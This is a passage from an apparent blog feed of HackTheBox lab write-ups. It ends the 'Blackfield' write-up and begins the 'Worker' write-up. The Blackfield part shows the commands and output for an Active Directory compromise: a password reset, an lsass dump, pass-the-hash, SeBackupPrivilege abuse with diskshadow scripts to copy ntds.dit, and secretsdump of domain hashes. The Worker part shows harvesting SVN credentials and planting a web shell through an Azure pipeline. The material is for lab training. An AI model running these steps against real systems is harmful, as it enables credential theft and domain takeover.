<li><code>-ns</code>: name server / DNS</li>
</ul>
<p>It returns the following output:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: DC01.BLACKFIELD.local
INFO: Found <span style="color:#ae81ff">1</span> domains
INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
INFO: Found <span style="color:#ae81ff">18</span> computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found <span style="color:#ae81ff">316</span> users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found <span style="color:#ae81ff">51</span> groups
INFO: Found <span style="color:#ae81ff">0</span> trusts
INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 18S
</code></pre></div><p>The output files from the tool are in json format. They are: <code>computers.json</code>, <code>domains.json</code>, <code>groups.json</code> and <code>users.json</code>.</p>
<p>I can upload these files to <code>BloodHound</code> GUI by drag and drop.</p>
<p><img class="img-container" src="imgs/image-20210504165340110.png" alt="image-20210504165340110"  />
</p>
<p>Enumerating the user <code>support</code> permissions discovers it has <code>ForceChangePassword</code> permission on Audit2020. That means user <code>support</code> is able to change the user <code>audit2020</code> password.</p>
<p><img class="img-container" src="imgs/image-20210504165510700.png" alt="image-20210504165510700"  />
</p>
<h4 id="reset-audit2020-password">Reset Audit2020 Password</h4>
<p>I can change the user <code>audit2020</code> password using <code>net rpc</code><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. I&rsquo;ll set <code>P@$$w0rd!</code> as the new password for user <code>audit2020</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ net rpc password audit2020 -U <span style="color:#e6db74">&#39;support%#00^BlackKnight&#39;</span> -S 10.10.10.192
Enter new password <span style="color:#66d9ef">for</span> audit2020: 
</code></pre></div><h3 id="access-as-audit2020">Access as Audit2020</h3>
<h4 id="forensic-share">forensic share</h4>
<p>With <code>audit2020</code>, I can access the forensic share.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ smbmap -H 10.10.10.192 -u audit2020 -p <span style="color:#e6db74">&#39;P@$$w0rd!&#39;</span> 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.192:445        Name: BLACKFIELD.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
</code></pre></div><p>Inside the share, there is three folders, and I&rsquo;ll download all of them to my Kali.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ smbclient -U <span style="color:#e6db74">&#39;audit2020%P@$$w0rd!&#39;</span>//10.10.10.192/forensic 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:03:16 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:03:16 <span style="color:#ae81ff">2020</span>
  commands_output                     D        <span style="color:#ae81ff">0</span>  Mon Feb <span style="color:#ae81ff">24</span> 01:14:37 <span style="color:#ae81ff">2020</span>
  memory_analysis                     D        <span style="color:#ae81ff">0</span>  Fri May <span style="color:#ae81ff">29</span> 03:28:33 <span style="color:#ae81ff">2020</span>
  tools                               D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:39:08 <span style="color:#ae81ff">2020</span>
smb: <span style="color:#ae81ff">\&gt;</span> recurse on
smb: <span style="color:#ae81ff">\&gt;</span> mget *
</code></pre></div><p>Enumerating on the memory_analysis folder, there is a file called <code>lsass.zip</code> that contains <code>lsass.DMP</code> which is interesting to me.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ file lsass.DMP
lsass.DMP: Mini DuMP crash report, <span style="color:#ae81ff">16</span> streams, Sun Feb <span style="color:#ae81ff">23</span> 18:02:01 2020, 0x421826 type
</code></pre></div><blockquote>
<p>LSASS (Local Security Authentication Subsystem Service) is a service/process that used to verify and authenticate users on login to a Windows computer. In other words, it holds the Windows credentials.</p>
</blockquote>
<p>I can use a tool called <code>pypykatz</code> to dump the contents of <code>lsass.DMP</code>. The NT hash of <code>svc-backup</code> immediately shows up on the top.</p>
<p><img class="img-container" src="imgs/image-20210504173356195.png" alt="image-20210504173356195"  />
</p>
<p><code>svc_backup:9658d1d1dcd9250115e2205d9f48400d</code>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-svc_backup">Shell as svc_backup</h3>
<h4 id="remote-access">Remote Access</h4>
<p>I already know that this user can login remotely (from <a href="#ldap-domain-dump">LDAP</a>), so I can try it with <code>evil-winrm</code>, and it works.</p>
<pre><code>→ root@iamf «blackfield» «10.10.14.169»
$ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
</code></pre><p><img class="img-container" src="imgs/image-20210504173749952.png" alt="image-20210504173749952"  />
</p>
<p>User flag is done here.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Also from <a href="#ldap-domain-dump">LDAP</a>, <code>svc-backup</code> is a member of the Backup Operators group. Each member of the Backup Operators group can perform backup and restore operations. The privilege name to perform those two operations are called <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>.</p>
<p><img class="img-container" src="imgs/image-20210504174334134.png" alt="image-20210504174334134"  />
</p>
<p>Those two privileges can be abused<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> using <code>diskshadow</code><sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>.</p>
<p>I can&rsquo;t just perform the backup and restore if the system is currently in use. But, there is a technology from Microsoft called &ldquo;Shadow Copy&rdquo; that makes this possible, and that&rsquo;s where <code>diskshadow</code> will be used.</p>
<p>So the idea is that I can create a volume shadow of <code>C:\</code> drive and backup the <code>NTDS.dit</code> file (AD database) from the volume shadow back to <code>C:\</code> drive. After that I can grab the <code>ntds.dit</code> and dump the NT hashes from <code>NTDS.dit</code> locally using <code>secretsdump.py</code>.</p>
<h4 id="abusing-sebackupprivilege">Abusing SeBackupPrivilege</h4>
<p>To abuse this privilege, I&rsquo;ll use <a href="https://gist.githubusercontent.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9/raw/38706044fb62790db16b0af21b7028a59591c05f/diskshadow.txt">this gist</a> as reference, and I&rsquo;ll need <a href="https://github.com/giuliano108/SeBackupPrivilege">this module</a>.</p>
<p>Then, I&rsquo;ll create a few scripts to perform all the needed actions (create a volume, grab <code>ntds.dit</code>, and cleanup the volume shadow) in one shot.</p>
<p>First, the script for grabbing <code>ntds.dit</code>, I&rsquo;ll save it as <code>copy.cmd</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
</code></pre></div><p>Second, the script for creating and deleting the volume shadow, I&rsquo;ll save it as <code>script.txt</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">set context persistent nowriters 
add volume c: alias iamf 
create 
expose %iamf% f: 
exec &#34;copy.cmd&#34; 
delete shadows volume %iamf% 
reset
</code></pre></div><p>I&rsquo;ll move the modules and the scripts to a folder called <code>exploits</code>.</p>
<pre><code>→ root@iamf «exploits» «10.10.14.169»
$ tree
.
├── SeBackupPrivilegeCmdLets.dll
├── SeBackupPrivilegeUtils.dll
├── copy.cmd
└── script.txt

0 directories, 4 files
</code></pre><p>Now, I’ll copy these <code>.dll</code> modules, <code>copy.cmd</code>, and <code>script.txt</code> to Blackfield using upload feature from <code>evil-winrm</code> at <code>C:\temp\</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «exploits» «10.10.14.169»
$ evil-winrm -i 10.10.10.192 -u svc_backup -H <span style="color:#e6db74">&#39;9658d1d1dcd9250115e2205d9f48400d&#39;</span>
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup<span style="color:#ae81ff">\D</span>ocuments&gt;mkdir C:<span style="color:#ae81ff">\t</span>emp; cd C:<span style="color:#ae81ff">\t</span>emp
...&lt;SNIP&gt;...
*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload SeBackupPrivilegeCmdLets.dll
...&lt;SNIP&gt;...
*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload SeBackupPrivilegeUtils.dll
...&lt;SNIP&gt;...
*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload copy.cmd
...&lt;SNIP&gt;...
*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload script.txt
...&lt;SNIP&gt;...
</code></pre></div><p>After that, I can run <code>diskshadow</code> with the <code>/s</code> option and specify <code>script.txt</code> as the command sequence.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; diskshadow /s script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/4/2020 8:15:53 AM

-&gt; set context persistent nowriters
-&gt; add volume c: alias iamf
-&gt; create

Alias iamf for shadow ID {7c53326a-2617-450c-9d2d-5c381352aa45} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c} set as environment variable.

Querying all shadow copies with the shadow copy set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c}

        * Shadow copy ID = {7c53326a-2617-450c-9d2d-5c381352aa45}               %iamf%
                - Shadow copy set: {6142125a-a889-46a9-9d5e-87ff17b66d2c}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 10/4/2020 8:15:54 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-&gt; expose %iamf% f:
-&gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45}
The shadow copy was successfully exposed as f:\.
-&gt; exec &#34;copy.cmd&#34;
C:\temp&gt;cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
Copied 18874368 bytes
-&gt; delete shadows volume %iamf%
-&gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45}
Deleting shadow copy {7c53326a-2617-450c-9d2d-5c381352aa45} on volume \\?\Volume{351b4712-0000-0000-0000-602200000000}\ from provider {b5946137-7b9f-4925-af80-51abd60b20d5} [Attributes: 0x00120019]...

Number of shadow copies deleted: 1
-&gt; reset
</code></pre></div><p>Now that I have the <code>ntds.dit</code>, the last file that I need is the registry hive.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; reg save HKLM\SYSTEM c:\temp\system
The operation completed successfully.
</code></pre></div><p>I&rsquo;ll download these files to my Kali using <code>evil-winrm</code> download feature.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; ls


    Directory: C:\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/4/2020   8:20 AM       18874368 ntds.dit 
-a----        10/4/2020   8:14 AM            222 copy.cmd
-a----        10/4/2020   8:15 AM            140 script.txt
-a----        10/4/2020   8:14 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----        10/4/2020   8:14 AM          16384 SeBackupPrivilegeUtils.dll
-a----        10/4/2020   8:21 AM       17547264 system
</code></pre></div><h4 id="credentials-dumping">Credentials Dumping</h4>
<p>Now I can dump the NT hash from <code>ntds.dit</code> and <code>system</code> file using <code>secretsdump.py</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
$ secretsdump.py -system system -ntds ntds.dit LOCAL
Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
...&lt;SNIP&gt;...
</code></pre></div><h4 id="remote-access-1">Remote Access</h4>
<p>I can use the NT hash of administrator account to login using <code>evil-winrm</code> <em>pass-the-hash</em> feature.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
$ evil-winrm -i 10.10.10.192 -u administrator -H <span style="color:#e6db74">&#39;184fb5e5178480be64824d4cd53b99ee&#39;</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210504210042888.png" alt="image-20210504210042888"  />
</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>It&rsquo;s an anonymous authentication, but limited only to the rootDSE. In the domain controller (DC) side, it needs to know who are we and what authentication do we support, so it sends us the same thing it asked which exposes&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">https://room362.com/post/2017/reset-ad-user-password-with-linux/</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p><a href="https://github.com/giuliano108/SeBackupPrivilege">https://github.com/giuliano108/SeBackupPrivilege</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Worker</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</link>
      <pubDate>Mon, 03 May 2021 17:01:02 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</guid>
      <description>Learn how Azure Pipelines can be exploited</description>
      <content:encoded><![CDATA[<p>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps. Using the second credentials I obtained, I&rsquo;m able to gain administrator access by exploiting Azure Pipeline.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>SVN enumeration</li>
<li>Windows enumeration</li>
<li>Exploiting Azure Pipelines</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>svn cli client - Preinstalled in Kali Linux</li>
<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial TCP scan with <code>nmap</code> discovers two open ports: 80 (HTTP) and 3690 (Subversion)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19» 
$ nmap -sC -sV -oN worker-initial -v 10.10.10.203
<span style="color:#75715e"># Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203</span>
Nmap scan report <span style="color:#66d9ef">for</span> dimension.worker.htb <span style="color:#f92672">(</span>10.10.10.203<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
3690/tcp open  svnserve Subversion
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre></div><p>Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
$ nmap -p53,445,389,5985 10.10.10.203
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-01-31 13:34 EST
Host is up <span style="color:#f92672">(</span>0.013s latency<span style="color:#f92672">)</span>.

PORT     STATE     SERVICE
<span style="color:#ae81ff">53</span>       filtered  domain
<span style="color:#ae81ff">389</span>      filtered  ldap
<span style="color:#ae81ff">445</span>      filtered  microsoft-ds
<span style="color:#ae81ff">5985</span>     open      wsman
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the port 80 displays the IIS default page.</p>
<p><img class="img-container" src="imgs/image-20210503174900610.png" alt="image-20210503174900610"  />
</p>
<h3 id="tcp-3690---subversionsvn">TCP 3690 - Subversion/SVN</h3>
<p>This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I&rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.</p>
<p>The general usage as follows:</p>
<pre><code>svn &lt;sub-command&gt; svn://[ip]
</code></pre><ul>
<li>Example of subcommand: <code>ls</code>, <code>cat</code>, <code>info</code>, <code>log</code>.</li>
</ul>
<p>With the subcommand <code>ls</code>, I can list the repository contents.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn ls svn://10.10.10.203
dimension.worker.htb/
moved.txt
</code></pre></div><p><code>moved.txt</code> tells that the repository is no longer maintained. The latest repo is available at <code>http://devops.worker.htb</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn cat svn://10.10.10.203/moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :<span style="color:#f92672">)</span>
</code></pre></div><p>With the subcommand <code>info</code>, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn info svn://10.10.10.203
Path: .
URL: svn://10.10.10.203
Relative URL: ^/
Repository Root: svn://10.10.10.203
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: <span style="color:#ae81ff">5</span>
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: <span style="color:#ae81ff">5</span>
Last Changed Date: 2020-06-20 09:52:00 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span>
</code></pre></div><p>I can check the revision log using the sub command <code>log</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn log svn://10.10.10.203
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r5 | nathen | 2020–06–20 09:52:00 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
Added note that repo has been migrated
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r4 | nathen | 2020–06–20 09:50:20 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
Moving this repo to our new devops server which will handle the deployment <span style="color:#66d9ef">for</span> us
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r3 | nathen | 2020–06–20 09:46:19 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
-
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r2 | nathen | 2020–06–20 09:45:16 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
Added deployment script
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r1 | nathen | 2020–06–20 09:43:43 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
First version
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
</code></pre></div><p>The commit message on <code>r2</code> seems interesting.</p>
<p>I can check the differences between <code>r1</code> and <code>r2</code> using the subcommand <code>diff</code>. The output shows there is a hard-coded credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn diff -r 1:2 svn://10.10.10.203/
</code></pre></div><p><img class="img-container" src="imgs/image-20210503175056134.png" alt="image-20210503175056134"  />
</p>
<p>From here, I&rsquo;ll take note about what I&rsquo;ve found here.</p>
<ul>
<li>Two subdomains: <code>dimension.worker.htb</code> and <code>devops.worker.htb</code></li>
<li>A set of credentials: <code>nathen:wendel98</code></li>
</ul>
<p>I&rsquo;ll add those two subdomains to my <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.203 dimension.worker.htb devops.worker.htb
</code></pre></div><p>Then after I make sure there is nothing left, I&rsquo;ll revisit port 80 with the newly discovered subdomain.</p>
<h3 id="tcp-80---dimensionworkerhtb">TCP 80 - dimension.worker.htb</h3>
<p>Visiting <code>dimension.worker.htb</code> presented with a static page.</p>
<p><img class="img-container" src="imgs/image-20210503175111010.png" alt="image-20210503175111010"  />
</p>
<p>It even leads to others static site (with subdomain) which I think they are just decoy.</p>
<p><img class="img-container" src="imgs/image-20210503175127918.png" alt="image-20210503175127918"  />
</p>
<p>Before moving on, I&rsquo;ll add all the subdomains I found on <code>/#work</code> to my <code>/etc/hosts</code>. They are:</p>
<ul>
<li><code>alpha.worker.htb</code></li>
<li><code>cartoon.worker.htb</code></li>
<li><code>lens.worker.htb</code></li>
<li><code>solid-state.worker.htb</code></li>
<li><code>spectral.worker.htb</code></li>
<li><code>story.worker.htb</code></li>
</ul>
<p>Now I&rsquo;ll jump over to the mentioned new DevOps server at <code>http://devops.worker.htb</code>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-iis-appool">Shell as IIS appool</h3>
<h4 id="azure-devops---smarthotel360">Azure DevOps - SmartHotel360</h4>
<p>Visiting <code>http://devops.worker.htb</code> pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, <code>nathen</code>, is currently working on a project called &ldquo;SmartHotel360&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210503175154637.png" alt="image-20210503175154637"  />
</p>
<p>My first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.</p>
<p><img class="img-container" src="imgs/image-20210503175211414.png" alt="image-20210503175211414"  />
</p>
<p>User permission or group related settings are found to be under the Security menu (Project Settings -&gt; Security Settings).</p>
<p>It seems user <code>nathen</code> is the only member of the SmartHotel360 Team.</p>
<p><img class="img-container" src="imgs/image-20210503175233456.png" alt="image-20210503175233456"  />
</p>
<p>And the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.</p>
<p><img class="img-container" src="imgs/image-20210503175249455.png" alt="image-20210503175249455"  />
</p>
<p>The Contributors group and Projects Valid Users group permissions are defined <a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">here</a>, and user <code>nathen</code> inherits those two groups' permission.</p>
<p><img class="img-container" src="imgs/image-20210503230648404.png" alt="image-20210503230648404"  />
</p>
<p>From there, I try to lookup into the project&rsquo;s repository.</p>
<p>I find a bunch of website repositories on the Repos menu. These repositories are previously listed on <code>http://dimension.worker.htb/#work</code> page. User <code>nathen</code> is the author of these repositories.</p>
<p><img class="img-container" src="imgs/image-20210503175346216.png" alt="image-20210503175346216"  />
</p>
<p>On the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.</p>
<blockquote>
<p>My video recommendation about CICD: <a href="https://www.youtube.com/watch?v=scEDHsr3APg">https://www.youtube.com/watch?v=scEDHsr3APg</a></p>
</blockquote>
<p><img class="img-container" src="imgs/image-20210503175356998.png" alt="image-20210503175356998"  />
</p>
<p>User <code>nathen</code> is allowed to queue a builds.</p>
<p><img class="img-container" src="imgs/image-20210503175409857.png" alt="image-20210503175409857"  />
</p>
<p>With all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.</p>
<h4 id="webshell-upload">Webshell Upload</h4>
<p>On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.</p>
<p>So, I&rsquo;ll upload my web shell which is <code>cmdasp.aspx</code> (because the web server is IIS) on a new branch. I’ll be using the alpha repository.</p>
<p><img class="img-container" src="imgs/image-20210503175435088.png" alt="image-20210503175435088"  />
</p>
<p>I&rsquo;ll pick any available work items.</p>
